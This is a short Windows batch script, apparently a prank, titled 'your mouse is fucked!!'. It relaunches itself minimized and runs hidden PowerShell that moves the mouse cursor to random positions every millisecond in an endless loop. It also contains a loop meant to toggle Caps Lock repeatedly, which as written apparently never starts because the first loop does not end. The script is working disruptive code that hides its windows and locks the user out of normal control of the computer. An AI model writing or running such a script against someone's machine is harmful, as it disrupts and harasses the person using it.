@echo off
title your mouse is fucked!!
mode con cols=15 lines=1
color 07

if "%~1"=="go" goto chaos
start /min "" "%~f0" go
exit

:chaos
powershell -nop -win hidden -c "Add-Type -AssemblyName System.Windows.Forms; while($true){ [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Max 2560),(Get-Random -Max 1440)); Start-Sleep -Milliseconds 1 }" >nul 2>&1

powershell -nop -win hidden -c "while($true){ $wsh = New-Object -ComObject WScript.Shell; $wsh.SendKeys('{CAPSLOCK}'); Start-Sleep -Milliseconds 80 }"

:loop
timeout /t 9999 >nul
goto loop
